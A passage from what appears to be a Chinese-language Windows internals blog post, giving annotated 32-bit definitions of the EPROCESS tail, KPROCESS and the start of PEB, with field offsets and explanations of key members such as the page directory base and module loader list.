class="title">ReadOperationCount</span>;</span>      <span class="comment">// 0x1B0: 读操作次数</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">WriteOperationCount</span>;</span>     <span class="comment">// 0x1B8: 写操作次数</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">OtherOperationCount</span>;</span>     <span class="comment">// 0x1C0: 其他操作次数</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">ReadTransferCount</span>;</span>       <span class="comment">// 0x1C8: 读取字节数总和</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">WriteTransferCount</span>;</span>      <span class="comment">// 0x1D0: 写入字节数总和</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">OtherTransferCount</span>;</span>      <span class="comment">// 0x1D8: 其他传输字节数</span></span><br><span class="line">    ULONG CommitChargeLimit;                      <span class="comment">// 0x1E0: 提交内存配额上限</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG CommitChargePeak;              <span class="comment">// 0x1E4: 提交内存配额峰值</span></span><br><span class="line">    VOID* AweInfo;                                <span class="comment">// 0x1E8: Address Windowing Extensions 支持</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SE_AUDIT_PROCESS_CREATION_INFO</span> <span class="title">SeAuditProcessCreationInfo</span>;</span> <span class="comment">// 0x1EC: 📌审计信息，指向映像路径（可能包含命令行、EXE 路径）的结构体，供审计系统使用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MMSUPPORT</span> <span class="title">Vm</span>;</span>                         <span class="comment">// 0x1F0: 进程的内存管理器支持结构（MMSUPPORT）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">MmProcessLinks</span>;</span>            <span class="comment">// 0x25C: 用于分页内存管理的进程链表</span></span><br><span class="line">    VOID* HighestUserAddress;                     <span class="comment">// 0x264: 用户态可访问的最高地址</span></span><br><span class="line">    ULONG ModifiedPageCount;                      <span class="comment">// 0x268: 被修改的页面计数</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG Flags2;                             <span class="comment">// 0x26C: 与调度、NUMA、安全、资源管理有关的扩展状态标志</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG JobNotReallyActive:<span class="number">1</span>;         <span class="comment">// bit 0: 进程关联的 Job 对象当前未被视为活跃状态</span></span><br><span class="line">            ULONG AccountingFolded:<span class="number">1</span>;           <span class="comment">// bit 1: 资源使用计数合并入 Job，不独立统计进程自身</span></span><br><span class="line">            ULONG NewProcessReported:<span class="number">1</span>;         <span class="comment">// bit 2: 进程创建事件已上报（防止重复报告）</span></span><br><span class="line">            ULONG ExitProcessReported:<span class="number">1</span>;        <span class="comment">// bit 3: 进程退出事件已上报</span></span><br><span class="line">            ULONG ReportCommitChanges:<span class="number">1</span>;        <span class="comment">// bit 4: 提交内存变化需要通知资源跟踪</span></span><br><span class="line">            ULONG LastReportMemory:<span class="number">1</span>;           <span class="comment">// bit 5: 记录上次内存报告（用于比较/优化）</span></span><br><span class="line">            ULONG ReportPhysicalPageChanges:<span class="number">1</span>;  <span class="comment">// bit 6: 页面物理位置变化需上报（诊断用途）</span></span><br><span class="line">            ULONG HandleTableRundown:<span class="number">1</span>;         <span class="comment">// bit 7: 句柄表正在清理中</span></span><br><span class="line">            ULONG NeedsHandleRundown:<span class="number">1</span>;         <span class="comment">// bit 8: 需要清理句柄表</span></span><br><span class="line">            ULONG RefTraceEnabled:<span class="number">1</span>;            <span class="comment">// bit 9: 启用引用计数跟踪</span></span><br><span class="line">            ULONG NumaAware:<span class="number">1</span>;                  <span class="comment">// bit10: 该进程为 NUMA 感知进程</span></span><br><span class="line">            ULONG ProtectedProcess:<span class="number">1</span>;           <span class="comment">// bit11: 📌受保护进程（如 lsass，不可注入/调试）</span></span><br><span class="line">            ULONG DefaultPagePriority:<span class="number">3</span>;        <span class="comment">// bit12–14: 默认页面优先级（用于分页决策）</span></span><br><span class="line">            ULONG PrimaryTokenFrozen:<span class="number">1</span>;         <span class="comment">// bit15: 主令牌被冻结（不可替换）</span></span><br><span class="line">            ULONG ProcessVerifierTarget:<span class="number">1</span>;      <span class="comment">// bit16: 启用进程验证器跟踪</span></span><br><span class="line">            ULONG StackRandomizationDisabled:<span class="number">1</span>; <span class="comment">// bit17: 禁用堆栈地址随机化（如调试中）</span></span><br><span class="line">            ULONG AffinityPermanent:<span class="number">1</span>;          <span class="comment">// bit18: 永久绑定 CPU 亲和性</span></span><br><span class="line">            ULONG AffinityUpdateEnable:<span class="number">1</span>;       <span class="comment">// bit19: 允许动态更新亲和性</span></span><br><span class="line">            ULONG PropagateNode:<span class="number">1</span>;              <span class="comment">// bit20: 跨 NUMA 节点传播数据</span></span><br><span class="line">            ULONG ExplicitAffinity:<span class="number">1</span>;           <span class="comment">// bit21: 已显式设置亲和性</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG Flags;                              <span class="comment">// 0x270: 控制进程生命周期、内存行为、调试行为等的主状态标志</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG CreateReported:<span class="number">1</span>;           <span class="comment">// bit 0: 已报告进程创建事件（如 ETW）</span></span><br><span class="line">            ULONG NoDebugInherit:<span class="number">1</span>;           <span class="comment">// bit 1: 禁止继承调试器（子进程隔离）</span></span><br><span class="line">            ULONG ProcessExiting:<span class="number">1</span>;           <span class="comment">// bit 2: 进程正在退出（终止流程中）</span></span><br><span class="line">            ULONG ProcessDelete:<span class="number">1</span>;            <span class="comment">// bit 3: 进程对象标记为删除</span></span><br><span class="line">            ULONG Wow64SplitPages:<span class="number">1</span>;          <span class="comment">// bit 4: 启用分页拆分机制（32位兼容性）</span></span><br><span class="line">            ULONG VmDeleted:<span class="number">1</span>;                <span class="comment">// bit 5: 虚拟内存空间已销毁</span></span><br><span class="line">            ULONG OutswapEnabled:<span class="number">1</span>;           <span class="comment">// bit 6: 允许被换出内存（Outswap）</span></span><br><span class="line">            ULONG Outswapped:<span class="number">1</span>;               <span class="comment">// bit 7: 已被换出内存</span></span><br><span class="line">            ULONG ForkFailed:<span class="number">1</span>;               <span class="comment">// bit 8: Fork 操作失败</span></span><br><span class="line">            ULONG Wow64VaSpace4Gb:<span class="number">1</span>;          <span class="comment">// bit 9: 启用 Wow64 的完整 4GB 虚拟地址空间</span></span><br><span class="line">            ULONG AddressSpaceInitialized:<span class="number">2</span>;  <span class="comment">// bit10–11: 地址空间初始化状态（0=未初始化，1=中，2=完成）</span></span><br><span class="line">            ULONG SetTimerResolution:<span class="number">1</span>;       <span class="comment">// bit12: 请求高分辨率定时器</span></span><br><span class="line">            ULONG BreakOnTermination:<span class="number">1</span>;       <span class="comment">// bit13: 📌终止进程时触发调试器中断</span></span><br><span class="line">            ULONG DeprioritizeViews:<span class="number">1</span>;        <span class="comment">// bit14: 降低视图优先级</span></span><br><span class="line">            ULONG WriteWatch:<span class="number">1</span>;               <span class="comment">// bit15: 启用写入监控页机制</span></span><br><span class="line">            ULONG ProcessInSession:<span class="number">1</span>;         <span class="comment">// bit16: 进程属于用户会话</span></span><br><span class="line">            ULONG OverrideAddressSpace:<span class="number">1</span>;     <span class="comment">// bit17: 允许覆盖地址空间</span></span><br><span class="line">            ULONG HasAddressSpace:<span class="number">1</span>;          <span class="comment">// bit18: 地址空间已分配</span></span><br><span class="line">            ULONG LaunchPrefetched:<span class="number">1</span>;         <span class="comment">// bit19: 由预取器发起的进程</span></span><br><span class="line">            ULONG InjectInpageErrors:<span class="number">1</span>;       <span class="comment">// bit20: 启用页错误注入</span></span><br><span class="line">            ULONG VmTopDown:<span class="number">1</span>;                <span class="comment">// bit21: 自顶向下分配地址空间</span></span><br><span class="line">            ULONG ImageNotifyDone:<span class="number">1</span>;          <span class="comment">// bit22: 映像加载通知已完成</span></span><br><span class="line">            ULONG PdeUpdateNeeded:<span class="number">1</span>;          <span class="comment">// bit23: 需要更新页目录项</span></span><br><span class="line">            ULONG VdmAllowed:<span class="number">1</span>;               <span class="comment">// bit24: 允许 V86 模式执行（虚拟 8086）</span></span><br><span class="line">            ULONG CrossSessionCreate:<span class="number">1</span>;       <span class="comment">// bit25: 允许跨会话创建</span></span><br><span class="line">            ULONG ProcessInserted:<span class="number">1</span>;          <span class="comment">// bit26: 📌进程已插入系统链表</span></span><br><span class="line">            ULONG DefaultIoPriority:<span class="number">3</span>;        <span class="comment">// bit27–29: 默认 I/O 优先级（0=低优先，3=普通）</span></span><br><span class="line">            ULONG ProcessSelfDelete:<span class="number">1</span>;        <span class="comment">// bit30: 允许进程自删除（常用于恶意进程清理）</span></span><br><span class="line">            ULONG SetTimerResolutionLink:<span class="number">1</span>;   <span class="comment">// bit31: 关联定时器精度链表</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    LONG ExitStatus;                              <span class="comment">// 0x274: 📌进程的退出码，259（0x103）是 Windows 的“还在运行”的默认占位退出码，可以借此判断进程是否退出</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MM_AVL_TABLE</span> <span class="title">VadRoot</span>;</span>                 <span class="comment">// 0x278: 📌VAD 树（内存分配记录 AVL 树）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ALPC_PROCESS_CONTEXT</span> <span class="title">AlpcContext</span>;</span>     <span class="comment">// 0x298: ALPC 本地进程通信上下文</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">TimerResolutionLink</span>;</span>       <span class="comment">// 0x2A8: 定时器精度链接节点</span></span><br><span class="line">    ULONG RequestedTimerResolution;               <span class="comment">// 0x2B0: 请求的定时器精度</span></span><br><span class="line">    ULONG ActiveThreadsHighWatermark;             <span class="comment">// 0x2B4: 活跃线程历史最高值</span></span><br><span class="line">    ULONG SmallestTimerResolution;                <span class="comment">// 0x2B8: 系统允许的最小定时器分辨率</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PO_DIAG_STACK_RECORD</span>* <span class="title">TimerResolutionStackRecord</span>;</span> <span class="comment">// 0x2BC: 用于记录调用栈等定时器信息</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="KPROCESS-Kernel-Process"><a href="#KPROCESS-Kernel-Process" class="headerlink" title="KPROCESS (Kernel Process)"></a>KPROCESS (Kernel Process)</h4><p>EPROCESS 的第一个成员，专用于内核调度，仅描述 CPU 调度相关属性 。</p><p>关键成员:</p><ul><li><code>DirectoryTableBase</code>:  CR3 寄存器值，即页目录基址。切换进程本质就是切换这个值来改变虚拟地址空间。</li><li><code>ThreadListHead</code>: 该进程下所有线程的链表头。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x98 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">DISPATCHER_HEADER</span> <span class="title">Header</span>;</span>             <span class="comment">// 0x00: 内核对象头，支持调度器的等待/信号机制（继承自调度器对象）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ProfileListHead</span>;</span>           <span class="comment">// 0x10: 性能分析器使用的链表，用于跟踪采样信息</span></span><br><span class="line">    ULONG DirectoryTableBase;                     <span class="comment">// 0x18: 📌页目录基址（CR3），用于进程虚拟地址空间的转换</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KGDTENTRY</span> <span class="title">LdtDescriptor</span>;</span>              <span class="comment">// 0x1C: 进程的 LDT（本地描述符表）描述符（32位兼容）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KIDTENTRY</span> <span class="title">Int21Descriptor</span>;</span>            <span class="comment">// 0x24: 兼容 INT 21H（DOS 中断）的描述符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ThreadListHead</span>;</span>            <span class="comment">// 0x2C: 📌本进程包含的所有线程链表头（每个 ETHREAD 挂在上面）</span></span><br><span class="line">    ULONG ProcessLock;                            <span class="comment">// 0x34: 内部同步锁，用于进程结构保护</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KAFFINITY_EX</span> <span class="title">Affinity</span>;</span>                <span class="comment">// 0x38: 允许在哪些处理器组（NUMA node）上运行的亲和性掩码</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ReadyListHead</span>;</span>             <span class="comment">// 0x44: 当前进程就绪线程列表（调度器使用）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SINGLE_LIST_ENTRY</span> <span class="title">SwapListEntry</span>;</span>      <span class="comment">// 0x4C: 换出链表，用于支持进程的虚拟内存分页</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAFFINITY_EX</span> <span class="title">ActiveProcessors</span>;</span><span class="comment">// 0x50: 当前活跃运行该进程线程的处理器掩码</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="keyword">volatile</span> LONG AutoAlignment:<span class="number">1</span>;        <span class="comment">// 0x5C.0: 自动对齐模式（用于捕获未对齐访问）</span></span><br><span class="line">            <span class="keyword">volatile</span> LONG DisableBoost:<span class="number">1</span>;         <span class="comment">// 0x5C.1: 禁用线程优先级提升（防止因等待而提升优先级）</span></span><br><span class="line">            <span class="keyword">volatile</span> LONG DisableQuantum:<span class="number">1</span>;       <span class="comment">// 0x5C.2: 禁用时间片限制（不被抢占）</span></span><br><span class="line">            <span class="keyword">volatile</span> ULONG ActiveGroupsMask:<span class="number">1</span>;    <span class="comment">// 0x5C.3: 活跃处理器组标志</span></span><br><span class="line">            <span class="keyword">volatile</span> LONG ReservedFlags:<span class="number">28</span>;       <span class="comment">// 0x5C.4~31: 保留</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">volatile</span> LONG ProcessFlags;               <span class="comment">// 0x5C: 原始标志位表示，整体视图</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    CHAR BasePriority;                            <span class="comment">// 0x60: 初始线程优先级（线程继承此值）</span></span><br><span class="line">    CHAR QuantumReset;                            <span class="comment">// 0x61: 时间片重置值（用于线程运行时刷新）</span></span><br><span class="line">    UCHAR Visited;                                <span class="comment">// 0x62: NUMA 节点访问标志（内部使用）</span></span><br><span class="line">    UCHAR Unused3;                                <span class="comment">// 0x63: 保留</span></span><br><span class="line"></span><br><span class="line">    ULONG ThreadSeed[<span class="number">1</span>];                          <span class="comment">// 0x64: 用于线程亲和性随机调度的种子</span></span><br><span class="line">    USHORT IdealNode[<span class="number">1</span>];                          <span class="comment">// 0x68: 线程理想的 NUMA 节点</span></span><br><span class="line">    USHORT IdealGlobalNode;                       <span class="comment">// 0x6A: 全局理想节点编号</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">KEXECUTE_OPTIONS</span> <span class="title">Flags</span>;</span>                <span class="comment">// 0x6C: 执行选项（禁止动态代码等安全配置）</span></span><br><span class="line">    UCHAR Unused1;                                <span class="comment">// 0x6D: 保留</span></span><br><span class="line">    USHORT IopmOffset;                            <span class="comment">// 0x6E: IO 权限位图偏移（用于 Virtual 8086 模式 I/O 控制）</span></span><br><span class="line"></span><br><span class="line">    ULONG Unused4;                                <span class="comment">// 0x70: 保留</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">KSTACK_COUNT</span> <span class="title">StackCount</span>;</span>               <span class="comment">// 0x74: 栈引用计数（线程栈使用情况）</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ProcessListEntry</span>;</span>          <span class="comment">// 0x78: 调度器用的进程链表项（可能链接所有活跃进程）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">volatile</span> ULONGLONG CycleTime;                 <span class="comment">// 0x80: 此进程被调度的 CPU 时间（时钟周期）</span></span><br><span class="line">    ULONG KernelTime;                             <span class="comment">// 0x88: 内核模式运行时间（单位：100ns）</span></span><br><span class="line">    ULONG UserTime;                               <span class="comment">// 0x8C: 用户模式运行时间（单位：100ns）</span></span><br><span class="line"></span><br><span class="line">    VOID* VdmTrapcHandler;                        <span class="comment">// 0x90: 虚拟 DOS 兼容处理程序（V86 模式支持）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="PEB-Process-Environment-Block"><a href="#PEB-Process-Environment-Block" class="headerlink" title="PEB (Process Environment Block)"></a>PEB (Process Environment Block)</h4><p>位于用户模式，存储进程的全局信息，描述当前进程的用户态环境，如模块、堆、TLS、参数等。</p><p>关键成员:<code>ImageBaseAddress</code> (基址), <code>Ldr</code> (模块加载链表), <code>ProcessParameters</code> (命令行参数) 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR InheritedAddressSpace;            <span class="comment">// 0x00: 是否继承地址空间（fork 子进程时为 TRUE）</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions;         <span class="comment">// 0x01: 是否读取镜像执行选项（调试器等兼容选项）</span></span><br><span class="line">    UCHAR BeingDebugged;                    <span class="comment">// 0x02: 当前进程是否正在被调试（由调试器设置）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        UCHAR BitField;                     <span class="comment">// 0x03: 标志位集合</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR ImageUsesLargePages:<span class="number">1</span>;            <span class="comment">// bit 0: 镜像是否使用大页内存</span></span><br><span class="line">            UCHAR IsProtectedProcess:<span class="number">1</span>;             <span class="comment">// bit 1: 是否为受保护进程（如 lsass）</span></span><br><span class="line">            UCHAR IsLegacyProcess:<span class="number">1</span>;                <span class="comment">// bit 2: 是否为传统进程（兼容旧系统）</span></span><br><span class="line">            UCHAR IsImageDynamicallyRelocated:<span class="number">1</span>;    <span class="comment">// bit 3: 是否启用了 ASLR（地址随机化）</span></span><br><span class="line">            UCHAR SkipPatchingUser32Forwarders:<span class="number">1</span>;   <span class="comment">// bit 4: 是否跳过 User32.dll 的 API 前向导出修补</span></span><br><span class="line">            UCHAR SpareBits:<span class="number">3</span>;                      <span class="comment">// bit 5-7: 保留位</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* Mutant;                          <span class="comment">// 0x04: 用于同步的互斥体句柄（防止并发创建）</span></span><br><span class="line">    VOID* ImageBaseAddress;               <span class="comment">// 0x08: 主模块（EXE）加载基地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span>* <span class="title">Ldr</span>;</span>            <span class="comment">// 0x0C: 指向模块加载器（LDR）数据结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span>* <span class="title">ProcessParameters</span>;</span> <span class="comment">// 0x10: 进程参数，如命令行、环境变量等</span></span><br><span class="line">    VOID* SubSystemData;                  <span class="comment">// 0x14: 子系统专用数据（如 POSIX 子系统）</span></span><br><span class="line">    VOID* ProcessHeap;                    <span class="comment">// 0x18: 默认进程堆的地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">FastPebLock</span>;</span>  <span class="comment">// 0x1C: 用于快速同步的临界区锁</span></span><br><span class="line">    VOID* AtlThunkSListPtr;               <span class="comment">// 0x20: ATL thunk 使用的单链表指针</span></span><br><span class="line">    VOID* IFEOKey;                        <span class="comment">// 0x24: 映像文件执行选项（Image File Execution Options）注册表键句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG CrossProcessFlags;          <span class="comment">// 0x28: 进程状态标志</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG ProcessInJob:<span class="number">1</span>;         <span class="comment">// bit 0: 进程是否属于 Job 对象</span></span><br><span class="line">            ULONG ProcessInitializing:<span class="number">1</span>;  <span class="comment">// bit 1: 进程是否尚在初始化中</span></span><br><span class="line">            ULONG ProcessUsingVEH:<span class="number">1</span>;      <span class="comment">// bit 2: 是否使用 VEH 异常处理（Vectored Exception Handler）</span></span><br><span class="line">            ULONG ProcessUsingVCH:<span class="number">1</span>;      <span class="comment">// bit 3: 是否使用 VCH 异常处理（Vectored Continue Handler）</span></span><br><span class="line">            ULONG ProcessUsingFTH:<span class="number">1</span>;      <span class="comment">// bit 4: 是否启用了故障容错处理（Fault Tolerant Heap）</span></span><br><span class="line">            ULONG ReservedBits0:<span class="number">27</span>;       <span class="comment">// bit 5-31: 保留</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* KernelCallbackTable;        <span class="comment">// 0x2C: 内核模式回调表（如 GUI 回调）</span></span><br><span class="line">        VOID* UserSharedInfoPtr;          <span class="comment">//        用户共享信息结构指针</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];             <span class="comment">// 0x30: 系统保留字段</span></span><br><span class="line">    ULONG AtlThunkSListPtr32;            <span class="comment">// 0x34: ATL thunk 用于 32 位兼容的单链表指针</span></span><br><span class="line">    VOID* ApiSetMap;                     <span class="comment">// 0x38: API Set 映射结构（用于模块重定向）</span></span><br><span class="line">    ULONG TlsExpansionCounter;           <span class="comment">// 0x3C: TLS 扩展槽计数器</span></span><br><span class="line">    VOID* TlsBitmap;                     <span class="comment">// 0x40: TLS 位图指针（标记可用的 TLS 插槽）</span></span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];             <span class="comment">// 0x44: TLS 位图本体（64 个槽）</span></span><br><span class="line">    VOID* ReadOnlySharedMemoryBase;      <span class="comment">// 0x4C: 只读共享内存基地址（Windows 内部用途）</span></span><br><span class="line">    VOID* HotpatchInformation;           <span class="comment">// 0x50: 热补丁相关结构体</span></span><br><span class="line">    VOID** ReadOnlyStaticServerData;     <span class="comment">// 0x54: 静态服务器数据的指针数组</span></span><br><span class="line">    VOID* AnsiCodePageData;              <span class="comment">// 0x58: ANSI 码页数据（LCID 对应）</span></span><br><span class="line">    VOID* OemCodePageData;               <span class="comment">// 0x5C: OEM 码页数据</span></span><br><span class="line">    VOID* UnicodeCaseTableData;          <span class="comment">// 0x60: Unicode 大小写映射表</span></span><br><span class="line">    ULONG NumberOfProcessors;            <span class="comment">// 0x64: 系统中可用的逻辑处理器数量</span></span><br><span class="line">    ULONG NtGlobalFlag;                  <span class="comment">// 0x68: 全局标志位（调试器、特殊分配等标记）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">CriticalSectionTimeout</span>;</span>  <span class="comment">// 0x70: 临界区超时时间（用于死锁检测）</span></span><br><span class="line">    ULONG HeapSegmentReserve;            <span class="comment">// 0x78: 堆段保留大小</span></span><br><span class="line">    ULONG HeapSegmentCommit;             <span class="comment">// 0x7C: 堆段提交大小</span></span><br><span class="line">    ULONG HeapDeCommitTotalFreeThreshold;<span class="comment">// 0x80: 堆释放总阈值</span></span><br><span class="line">    ULONG HeapDeCommitFreeBlockThreshold;<span class="comment">// 0x84: 堆释放单块阈值</span></span><br><span class="line">    ULONG NumberOfHeaps;                 <span class="comment">// 0x88: 当前进程拥有的堆数量</span></span><br><span class="line">    ULONG MaximumNumberOfHeaps;          <span class="comment">// 0x8C: 最大堆数量</span></span><br><span class="line">    VOID** ProcessHeaps;                 <span class="comment">// 0x90: 堆数组指针（实际堆地址数组）</span></span><br><span class="line">    VOID* GdiSharedHandleTable;          <span class="comment">// 0x94: GDI 共享句柄表</span></span><br><span class="line">    VOID* ProcessStarterHelper;          <span class="comment">// 0x98: 启动帮助函数</span></span><br><span class="line">    ULONG GdiDCAttributeList;            <span class="comment">// 0x9C: GDI DC 属性位图（标识属性状态）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">LoaderLock</span>;</span>  <span class="comment">// 0xA0: Ldr 模块加载器锁</span></span><br><span class="line">    ULONG OSMajorVersion;                <span class="comment">// 0xA4: 操作系统主版本号</span></span><br><span class="line">    ULONG OSMinorVersion;                <span class="comment">// 0xA8: 操作系统次版本号</span></span><br><span class="line">    USHORT OSBuildNumber;                <span 